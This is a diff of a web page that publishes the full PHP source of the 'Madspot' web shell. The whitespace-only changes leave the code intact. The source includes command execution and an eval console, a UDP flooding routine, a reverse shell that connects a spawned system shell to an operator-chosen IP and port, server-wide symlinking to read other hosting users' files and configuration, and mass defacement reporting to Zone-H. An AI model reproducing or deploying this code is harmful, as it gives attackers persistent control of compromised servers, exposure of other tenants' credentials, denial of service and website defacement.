@@ -27,10 +27,11 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
   * Perl 500 Internal Error Bypass
   * Killcode (Delete Shell)
 
+
 ## Madspot shell source code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php
-     
+
     /**
      * @author Ikram ALI
      * @copyright 2012
@@ -43,7 +44,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     @ini_set('max_execution_time',0);
     @set_time_limit(0);
     @set_magic_quotes_runtime(0);
-     
+
     if(get_magic_quotes_gpc()) {
             function madstripslashes($array) {
                     return is_array($array) ? array_map('madstripslashes', $array) : stripslashes($array);
@@ -57,22 +58,22 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
         $sys='win';
      else
         $sys='unix';
-       
+
     $home_cwd = @getcwd();
     if(isset($_POST['c']))
             @chdir($_POST['c']);  
-       
+
     $cwd = @getcwd();
     if($sys == 'win')
     {
         $home_cwd = str_replace("\\", "/", $home_cwd);
             $cwd = str_replace("\\", "/", $cwd);
     }
-     
+
     if($cwd[strlen($cwd)-1] != '/' )
             $cwd .= '/';
-       
-       
+
+
     function madEx($in) {
             $out = '';
             if (function_exists('exec')) {
@@ -113,7 +114,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
         fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
       }
       }
-     
+
     if ($file) {
       fclose($file);
     }
@@ -121,18 +122,18 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
       fclose($newf);
     }
     }
-     
-       
-     
+
+
+
      function madhead()
      {
         if(empty($_POST['charset']))
                     $_POST['charset'] = $GLOBALS['default_charset'];
-     
+
     $freeSpace = @diskfreespace($GLOBALS['cwd']);
     $totalSpace = @disk_total_space($GLOBALS['cwd']);
-    $totalSpace = $totalSpace?$totalSpace:1;        
-       
+    $totalSpace = $totalSpace?$totalSpace:1;
+
     $on="&lt;font color=#0F0&gt; ON &lt;/font&gt;";
     $of="&lt;font color=red&gt; OFF &lt;/font&gt;";
     $none="&lt;font color=#0F0&gt; NONE &lt;/font&gt;";  
@@ -143,16 +144,16 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     if(function_exists('mysql_get_client_info'))
         $mysql=$on;
      else
-        $mysql=$of;      
+        $mysql=$of;
     if(function_exists('mssql_connect'))
         $mssql=$on;
     else
        $mssql=$of;
-                   
+
     if(function_exists('pg_connect'))
         $pg=$on;
     else
-       $pg=$of;            
+       $pg=$of;
     if(function_exists('oci_connect'))
        $or=$on;
     else
@@ -169,8 +170,8 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     $open_b=@ini_get('open_basedir');
         else
       $open_b=$none;
-       
-     
+
+
     if(@ini_get('safe_mode_exec_dir'))
     $safe_exe=@ini_get('safe_mode_exec_dir');
         else
@@ -194,8 +195,8 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     $group = $gid['name'];
                     $gid = $gid['gid'];
             }
-     
-     
+
+
          $cwd_links = '';
             $path = explode("/", $GLOBALS['cwd']);
             $n=count($path);
@@ -205,16 +206,16 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                             $cwd_links .= $path[$j].'/';
                     $cwd_links .= "\")'&gt;".$path[$i]."/&lt;/a&gt;";
             }
-     
+
     $drives = "";
     foreach(range('c','z') as $drive)
     if(is_dir($drive.':\\'))
     $drives .= '&lt;a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')"&gt;[ '.$drive.' ]&lt;/a&gt; ';
-     
-     
-     
-     
-     
+
+
+
+
+
      echo '&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
     &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
     &lt;head&gt;
@@ -300,7 +301,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             color: #000;
             background: #fff;
     }
-     
+
     .foot {
             font-family: Verdana, Geneva, sans-serif;
             background-color: #000;
@@ -339,16 +340,16 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
          background-color:red;  
        }
        ";
-        }    
+        }
      echo '.main th{text-align:left;}
     .main a{color: #FFF;}
     .main tr:hover{background-color:red;}
     .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
     .bigarea{ width:99%; height:300px; }  
      &lt;/style&gt;
-     
+
     ';
-     
+
     echo "&lt;script&gt;
        var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
        var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
@@ -369,11 +370,11 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     set(a,c,p1,p2,p3,charset);
                     d.mf.submit();
             }&lt;/script&gt;";
-     
-       
+
+
             echo '
     &lt;/head&gt;
-     
+
     &lt;body bgcolor="#000000"  leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"&gt;
     &lt;div class="whole"&gt;
     &lt;form method=post name=mf style="display:none;"&gt;
@@ -405,7 +406,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
      &lt;tr&gt;
        &lt;td&gt;&lt;span&gt;WEBS:&lt;/span&gt;&lt;/td&gt;
        &lt;td width="76%"&gt;';
-       
+
         if($GLOBALS['sys']=='unix')
         {
             $d0mains = @file("/etc/named.conf");
@@ -432,19 +433,19 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             }
         }
         else{ echo"CANT READ |Windows|";}
-       
+
           echo '&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
        &lt;td height="16"&gt;&lt;span&gt;HDD:&lt;/span&gt;&lt;/td&gt;
        &lt;td&gt;'.madSize($totalSpace).' &lt;span&gt;Free:&lt;/span&gt;' . madSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]&lt;/td&gt;
        &lt;/tr&gt;';
-     
+
          if($GLOBALS['sys']=='unix' )
     {
         if(!@ini_get('safe_mode'))
         {
-       
+
         echo '&lt;tr&gt;&lt;td height="18" colspan="2"&gt;&lt;span&gt;Useful : &lt;/span&gt;';
         $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
          foreach($userful as $item)
@@ -454,14 +455,14 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             &lt;/tr&gt;
              &lt;tr&gt;
              &lt;td height="0" colspan="2"&gt;&lt;span&gt;Downloader:&lt;/span&gt;';
-             
+
          $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
           foreach($downloaders as $item2)
            if(madWhich($item2))
             echo $item2.',';
             echo '&lt;/td&gt;
                  &lt;/tr&gt;';
-             
+
               }
                else
                {
@@ -479,10 +480,10 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             &lt;/tr&gt; &lt;tr&gt;
            &lt;td height="0" colspan="2"&gt;&lt;span&gt;Downloader: &lt;/span&gt;-------------&lt;/td&gt;
                  &lt;/tr&gt;';
-       
+
     }  
-       
-     
+
+
      echo '&lt;tr&gt;
        &lt;td height="16" colspan="2"&gt;&lt;span&gt;Disabled functions:&lt;/span&gt;'.$disfun.'&lt;/td&gt;
      &lt;/tr&gt;
@@ -503,7 +504,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
        &lt;td colspan="2"&gt;'.$drives.'&lt;/td&gt;
         &lt;/tr&gt;';
       }
-     
+
       echo '&lt;tr&gt;
        &lt;td height="12"&gt;&lt;span&gt;PWD:&lt;/span&gt;&lt;/td&gt;
        &lt;td colspan="2"&gt;'.$cwd_links.'  &lt;a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"&gt;&lt;font color=red &gt;|CURRENT|&lt;/font&gt;&lt;/a&gt;&lt;/td&gt;
@@ -513,7 +514,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     &lt;div id="meunlist"&gt;
          &lt;ul&gt;
     &lt;li&gt;&lt;a href="#" onclick="g(\'FilesMan\',null,\'\',\'\',\'\')"&gt;HOME&lt;/a&gt;&lt;/li&gt;
-     
+
     &lt;li&gt;&lt;a href="#" onclick="g(\'proc\',null,\'\',\'\',\'\')"&gt;PROCESS&lt;/a&gt;&lt;/li&gt;
     &lt;li&gt;&lt;a href="#" onclick="g(\'phpeval\',null,\'\',\'\',\'\')"&gt;EVAL&lt;/a&gt;&lt;/li&gt;
     &lt;li&gt;&lt;a href="#" onclick="g(\'sql\',null,\'\',\'\',\'\')"&gt;SQL&lt;/a&gt;&lt;/li&gt;
@@ -526,15 +527,15 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     &lt;li&gt;&lt;a href="#" onclick="g(\'spot\',null,\'\',\'\',\'\')"&gt;MADSPOT&lt;/a&gt;&lt;/li&gt;
     &lt;li&gt;&lt;a href="#" onclick="g(\'selfrm\',null,\'\',\'\',\'\')"&gt;KIll C0de&lt;/a&gt;&lt;/li&gt;
     &lt;/ul&gt;
-       
+
        &lt;/div&gt;
     ';  
-       
+
     }
-     
+
     function madfooter()
     {
-       
+
         echo "&lt;table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' &gt;
           &lt;tr&gt;
             &lt;td width='17%'&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"&gt;&lt;span&gt;__MK FILE__&lt;/span&gt;&lt;br&gt;&lt;input class='dir'  type=text name=f value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
@@ -562,22 +563,22 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
      &lt;/body&gt;
     &lt;/html&gt;
     ";
-       
+
     }
     if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
        function posix_getpwuid($p) {return false;} }
     if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
       function posix_getgrgid($p) {return false;} }
-     
+
     function madWhich($p) {
             $path = madEx('which ' . $p);
             if(!empty($path))
                     return $path;
             return false;
     }
-     
-     
-     
+
+
+
     function madSize($s) {
             if($s &gt;= 1073741824)
                     return sprintf('%1.2f', $s / 1073741824 ). ' GB';
@@ -588,8 +589,8 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             else
                     return $s . ' B';
     }
-     
-     
+
+
     function madPerms($p) {
             if (($p & 0xC000) == 0xC000)$i = 's';
             elseif (($p & 0xA000) == 0xA000)$i = 'l';
@@ -618,7 +619,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             else
                     return '&lt;font color=#25ff00&gt;' . madPerms(@fileperms($f)) . '&lt;/font&gt;';
     }
-     
+
     if(!function_exists("scandir")) {
             function scandir($dir) {
                     $dh  = opendir($dir);
@@ -627,8 +628,8 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     return $files;
             }
     }
-     
-     
+
+
     function madFilesMan() {
             madhead();
         echo '&lt;div class=header&gt;&lt;script&gt;p1_=p2_=p3_="";&lt;/script&gt;';
@@ -727,11 +728,11 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             &lt;input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'&gt;
             &lt;input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'&gt;
             &lt;/form&gt;&lt;/table&gt;&lt;/div&gt;";
-     
-           
+
+
         madfooter();
      }
-       
+
       function madFilesTools() {
             if( isset($_POST['p1']) )
                     $_POST['p1'] = urldecode($_POST['p1']);
@@ -761,7 +762,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                             }
                     }
             }
-           
+
        madhead();
             echo '&lt;div class=header&gt;';
             if( !file_exists(@$_POST['p1']) ) {
@@ -889,11 +890,11 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             echo '&lt;/div&gt;';
             madFooter();
     }  
-     
+
     function madphpeval()
     {
         madhead();
-       
+
         if(isset($_POST['p2']) && ($_POST['p2'] == 'ini')) {
                     echo '&lt;div class=header&gt;';
                     ob_start();
@@ -914,7 +915,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
                     echo str_replace('&lt;h1','&lt;h2', $tmp) .'&lt;/div&gt;&lt;br&gt;';
             }
-       
+
         if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
                     echo '&lt;div class=header&gt;&lt;style&gt;.p {color:#000;}&lt;/style&gt;';
                     ob_start();
@@ -924,7 +925,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
                     echo str_replace('&lt;h1','&lt;h2', $tmp) .'&lt;/div&gt;&lt;br&gt;';
             }
-       
+
         if(isset($_POST['p2']) && ($_POST['p2'] == 'exten')) {
                     echo '&lt;div class=header&gt;';
                     ob_start();
@@ -933,12 +934,12 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             .implode('&lt;/td&gt;&lt;/tr&gt;'."\n".'&lt;tr&gt;&lt;td class="listing"&gt;', $EXT)
             .'&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'
             .count($EXT).' extensions loaded';
-                   
-           
+
+
             echo '&lt;/div&gt;&lt;br&gt;';
             }
-       
-       
+
+
             if(empty($_POST['ajax']) && !empty($_POST['p1']))
                     $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
         echo '&lt;div class=header&gt;&lt;Center&gt;&lt;a href=# onclick="g(\'phpeval\',null,\'\',\'ini\')"&gt;| INI_INFO | &lt;/a&gt;&lt;a href=# onclick="g(\'phpeval\',null,\'\',\'info\')"&gt;    | phpinfo |&lt;/a&gt;&lt;a href=# onclick="g(\'phpeval\',null,\'\',\'exten\')"&gt;   | extensions  |&lt;/a&gt;&lt;/center&gt;&lt;br&gt;&lt;form name=pf method=post onsubmit="g(\'phpeval\',null,this.code.value,\'\'); return false;"&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'&lt;/textarea&gt;&lt;center&gt;&lt;input type=submit value=Eval style="margin-top:5px"&gt;&lt;/center&gt;';
@@ -949,10 +950,10 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     echo htmlspecialchars(ob_get_clean());
             }
             echo '&lt;/pre&gt;&lt;/div&gt;';
-     
+
         madfooter();
     }
-     
+
     function madhash()
     {
         if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
@@ -971,9 +972,9 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     'Url decode' =&gt; 'urldecode',
                     'Full urlencode' =&gt; 'full_urlencode',
                     'Htmlspecialchars' =&gt; 'htmlspecialchars',
-                   
+
             );
-           
+
             madhead();
             echo '&lt;div class=header&gt;';
             if(empty($_POST['ajax'])&&!empty($_POST['p1']))
@@ -987,7 +988,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             }
             echo "&lt;/div&gt;";
             madFooter();
-       
+
     }
     function maddos()
     {
@@ -1011,12 +1012,12 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                 $out .= 'X';
             }
             while(1){
-       
+
              $packets++;
                 if(time() &gt; $max_time){
                         break;
                 }
-               
+
                 $fp = fsockopen('udp://'.$host, $portudp, $errno, $errstr, 5);
                 if($fp){
                         fwrite($fp, $out);
@@ -1026,12 +1027,12 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
              echo "$packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second";
              echo "&lt;/pre&gt;";
         }
-       
+
         echo '&lt;/div&gt;';
-       
-        madfooter();        
+
+        madfooter();
     }
-     
+
     function madproc()
     {
         madhead();
@@ -1067,7 +1068,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
         "Fstab" =&gt;"cat /etc/fstab",
         "HDD Space" =&gt; "df -h"
         );}
-       
+
         foreach($process as $n =&gt; $link)
         {
             echo '&lt;a href="#" onclick="g(null,null,\''.$link.'\')"&gt; | '.$n.' | &lt;/a&gt;';
@@ -1082,7 +1083,7 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
          echo "&lt;/div&gt;";
          madfooter();
          }
-         
+
     function madsafe()
     {
         madhead();
@@ -1115,9 +1116,9 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
         }
         echo "&lt;br&gt;&lt;/div&gt;";
         madfooter();
-       
+
     }
-     
+
     function madconnect()
     {
      madhead();
@@ -1141,10 +1142,10 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     }
             if($_POST['p1']=='php')
      {
-               
+
     @set_time_limit (0);
     $ip = $_POST['p2'];
-    $port =$_POST['p3'];    
+    $port =$_POST['p3'];
     $chunk_size = 1400;
     $write_a = null;
     $error_a = null;
@@ -1152,92 +1153,92 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     $daemon = 0;
     $debug = 0;
     echo "&lt;pre class=ml1 style='margin-top:5px'&gt;";
-     
+
     if (function_exists('pcntl_fork')) {
-           
+
             $pid = pcntl_fork();
-           
+
             if ($pid == -1) {
                     echo "Cant fork!&lt;br&gt;";
                     exit(1);
             }
-           
+
             if ($pid) {
                     exit(0);  
             }
-     
+
             if (posix_setsid() == -1) {
                     echo "Error: Can't setsid()&lt;br&gt;";
                     exit(1);
             }
-     
+
             $daemon = 1;
     } else {
             echo "WARNING: Failed to daemonise.  This is quite common and not fatal&lt;br&gt;";
     }
-     
+
     chdir("/");
-     
+
     umask(0);
-     
+
     $sock = fsockopen($ip, $port, $errno, $errstr, 30);
     if (!$sock) {
             echo "$errstr ($errno)";
             exit(1);
     }
-     
-     
+
+
     $descriptorspec = array(
        0 =&gt; array("pipe", "r"),  
        1 =&gt; array("pipe", "w"),  
        2 =&gt; array("pipe", "w")  
     );
-     
+
     $process = proc_open($shell, $descriptorspec, $pipes);
-     
+
     if (!is_resource($process)) {
             echo "ERROR: Can't spawn shell&lt;br&gt;";
             exit(1);
     }
-     
-     
+
+
     @stream_set_blocking($pipes[0], 0);
     @stream_set_blocking($pipes[1], 0);
     @stream_set_blocking($pipes[2], 0);
     @stream_set_blocking($sock, 0);
-     
+
     echo "Successfully opened reverse shell to $ip:$port&lt;br&gt;";
-     
+
     while (1) {
             if (feof($sock)) {
                     echo "ERROR: Shell connection terminated&lt;br&gt;";
                     break;
             }
-     
+
             if (feof($pipes[1])) {
                     echo "ERROR: Shell process terminated&lt;br&gt;";
                     break;
             }
-     
-           
+
+
             $read_a = array($sock, $pipes[1], $pipes[2]);
             $num_changed_sockets=@stream_select($read_a, $write_a, $error_a, null);
-     
+
             if (in_array($sock, $read_a)) {
                     if ($debug) echo "SOCK READ&lt;br&gt;";
                     $input=fread($sock, $chunk_size);
                     if ($debug) echo "SOCK: $input&lt;br&gt;";
                     fwrite($pipes[0], $input);
             }
-     
+
             if (in_array($pipes[1], $read_a)) {
                     if ($debug) echo "STDOUT READ&lt;br&gt;";
                     $input = fread($pipes[1], $chunk_size);
                     if ($debug) echo "STDOUT: $input&lt;br&gt;";
                     fwrite($sock, $input);
             }
-     
-           
+
+
             if (in_array($pipes[2], $read_a)) {
                     if ($debug) echo "STDERR READ&lt;br&gt;";
                     $input = fread($pipes[2], $chunk_size);
@@ -1245,16 +1246,16 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                     fwrite($sock, $input);
             }
     }
-     
+
     fclose($sock);
     fclose($pipes[0]);
     fclose($pipes[1]);
     fclose($pipes[2]);
     proc_close($process);
-     
+
     echo "&lt;/pre&gt;";
     }
-     
+
     }  
      echo "&lt;/div&gt;";
      madfooter();
@@ -1348,41 +1349,41 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             echo "Site : ".$sites[$i]." Defaced !&lt;br&gt;";
             ++$i;
             }
-         
+
         "Sending Sites To Zone-H Has Been Completed Successfully !! &lt;/pre&gt;";
     }
     echo "&lt;/div&gt;";
     madfooter();
-       
+
     }
     function madspot()
     {
         madhead();
         echo "&lt;div class=header&gt;";
         echo "&lt;pre&gt;
-       
+
                               |`-:_
-     ,----....____            |    `+.                                                          
+     ,----....____            |    `+.
     (             ````----....|___   |
      \     _                      ````----....____
-      \    _)  Coded By: Ikram Ali                ```---.._                      
+      \    _)  Coded By: Ikram Ali                ```---.._
        \                                                   \
      )`.\  )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )hh
     -'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `
       Madspot is a Team of professional Ethical Hackers From Pakistan.
       We have Years of  Experience in  Security, Penetration & Coding
       And can Break and Secure.
-     
+
       Version 1.0
-     
+
       Contact : http://www.madspot.net
-     
+
       if you found bug contact our team
-     
-     
-     
-     
-                 .=''=.            
+
+
+
+
+                 .=''=.
                 / _  _ \
                |  d  b  |
                \   /\   /
@@ -1392,8 +1393,8 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
             \/ \ Rasheed/ \/    -----------------------------
                 '.    .'
                 _|`~~`|_
-                /|\  /|\    
-           
+                /|\  /|\
+
           .- &lt;O&gt; -.        .-====-.      ,-------.      .-=&lt;&gt;=-.
       /_-\'''/-_\      / / '' \ \     |,-----.|     /__----__\
      |/  o) (o  \|    | | ')(' | |   /,'-----'.\   |/ (')(') \|
@@ -1403,77 +1404,77 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     (_)     .     (_)  /  Ikram   \   / M-Usman \  (_)   <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_neutral.gif" alt=":|" class="wp-smiley" />   (_)
     \_-----'____--/  (_)  Ali   (_) (_)_______(_)   |___:|____|
      \___________/     |________|     \_______/     | Afrasiab|
-     
-     
-           
-     
-     
+
+
+
+
+
        &lt;/pre&gt;&lt;/div&gt;";
         madfooter();
-       
+
         }
-       
+
     function madsymlink()
     {
         madhead();
-       
+
     $IIIIIIIIIIIl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
     $IIIIIIIIIII1=explode('/',$IIIIIIIIIIIl );
     $IIIIIIIIIIIl =str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1)-1],'',$IIIIIIIIIIIl );  
-       
-       
-       
-     
+
+
+
+
        echo '&lt;div class=header&gt;&lt;script&gt;p1_=p2_=p3_="";&lt;/script&gt;&lt;br&gt;&lt;center&gt;&lt;h3&gt;&lt;a href=# onclick="g(\'symlink\',null,\'website\',null)"&gt;| Domains | &lt;/a&gt;&lt;a href=# onclick="g(\'symlink\',null,null,\'whole\')"&gt;| Whole Server Symlink | &lt;/a&gt;&lt;a href=# onclick="g(\'symlink\',null,null,null,\'config\')"&gt;| Config PHP symlink | &lt;/a&gt;&lt;/h3&gt;&lt;/center&gt;';
-       
+
         if(isset($_POST['p1']) && $_POST['p1']=='website')
         {
             echo "&lt;center&gt;";
             $d0mains = @file("/etc/named.conf");
             if(!$d0mains){ echo "&lt;pre class=ml1 style='margin-top:5px'&gt;Cant access this file on server -&gt; [ /etc/named.conf ]&lt;/pre&gt;&lt;/center&gt;"; }
-     
-     
-     
+
+
+
     echo "&lt;table align=center class='main'  border=0  &gt;
-     
+
     &lt;tr bgcolor=Red&gt;&lt;td&gt;Count&lt;/td&gt;&lt;td&gt;domains&lt;/td&gt;&lt;td&gt;users&lt;/td&gt;&lt;/tr&gt;";
     $count=1;
     foreach($d0mains as $d0main){
-     
+
     if(@eregi("zone",$d0main)){
-     
+
     preg_match_all('#zone "(.*)"#', $d0main, $domains);
-     
+
     flush();
-     
+
     if(strlen(trim($domains[1][0])) &gt; 2){
-     
+
     $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
-     
+
     echo "&lt;tr&gt;&lt;td&gt;".$count."&lt;/td&gt;&lt;td&gt;&lt;a href=http://www.".$domains[1][0]."/&gt;".$domains[1][0]."&lt;/a&gt;&lt;/td&gt;&lt;td&gt;".$user['name']."&lt;/td&gt;&lt;/tr&gt;"; flush();
     $count++;
     }}}
     echo "&lt;/center&gt;&lt;/table&gt;";
      }
-     
+
      if(isset($_POST['p2']) && $_POST['p2']=='whole')
      {
-       
-       
+
+
         @set_time_limit(0);
-       
+
         echo "&lt;center&gt;";
-       
-     
-           
+
+
+
     @mkdir('sym',0777);
     $IIIIIIIIIIl1  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
     $IIIIIIIIII1I =@fopen ('sym/.htaccess','w');
     fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
     @symlink('/','sym/root');
     $IIIIIIIIIlIl = basename('_FILE_');
-       
-       
+
+
     $IIIIIIIIIllI = @file('/etc/named.conf');
     if(!$IIIIIIIIIllI)
     {
@@ -1499,36 +1500,36 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     }
     echo "
     &lt;tr&gt;
-     
+
     &lt;td&gt;
     &lt;a target='_blank' href=http://www.".$IIIIIIIIIl11[1][0].'/&gt;'.$IIIIIIII1I1l.' &lt;/a&gt;
     &lt;/td&gt;
-     
+
     &lt;td&gt;
     '.$IIIIIIIII1I1['name']."
     &lt;/td&gt;
-     
+
     &lt;td&gt;
     &lt;a href='sym/root/home/".$IIIIIIIII1I1['name']."/public_html' target='_blank'&gt;symlink &lt;/a&gt;
     &lt;/td&gt;
-     
-     
+
+
     &lt;/tr&gt;";
     flush();
     }
     }
     }
     }
-       
-    echo "&lt;/center&gt;&lt;/table&gt;";    
-       
+
+    echo "&lt;/center&gt;&lt;/table&gt;";
+
      }
-     
-     
-     
+
+
+
      if(isset($_POST['p3']) && $_POST['p3']=='config')
-     
-     
+
+
      {
       echo "&lt;center&gt;";
     @mkdir('sym',0777);
@@ -1537,8 +1538,8 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     @fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
     @symlink('/','sym/root');
     $IIIIIIIIIlIl = basename('_FILE_');
-     
-       
+
+
        $IIIIIIIIIllI = @file('/etc/named.conf');
     if(!$IIIIIIIIIllI)
     {
@@ -1644,19 +1645,19 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
     }
     }
     echo "&lt;/center&gt;&lt;/table&gt;";  
-       
+
      }
-       
+
         echo "&lt;/div&gt;";
         madfooter();
-       
-    }    
-     
-     
+
+    }
+
+
     function madsql()
     {
-       
-       
+
+
         class DbClass {
                     var $type;
                     var $link;
@@ -1988,12 +1989,12 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
         }
             echo '&lt;/div&gt;';
         madfooter();
-       
+
      }
-     
+
      function madselfrm()
      {
-       
+
         if($_POST['p1'] == 'yes')
                     if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
                             die('Shell has been removed');
@@ -2002,10 +2003,10 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
         if($_POST['p1'] != 'yes')
             madhead();
             echo "&lt;div class=header&gt;&lt;pre class=ml1 style='margin-top:5px'&gt;";
-       
-       
+
+
         echo "
-       
+
                    /^\
           _.-`:   /   \   :'-._
         ,`    :  |     |  :    '.
@@ -2025,15 +2026,15 @@ The Madspot shell is written in PHP, runs on both Linux and Windows serves, and 
                  |     |
                  |     |
     ";
-       
-       
-       
+
+
+
         echo '&lt;br&gt;Kill Me?&lt;br&gt;&lt;a href=# onclick="g(null,null,\'yes\')"&gt;Yes&lt;/a&gt;&lt;/div&gt;';
             madFooter();
-       
+
      }
-     
-     
+
+
     if( empty($_POST['a']) )
             if(isset($default_action) && function_exists('mad' . $default_action))
                     $_POST['a'] = $default_action;
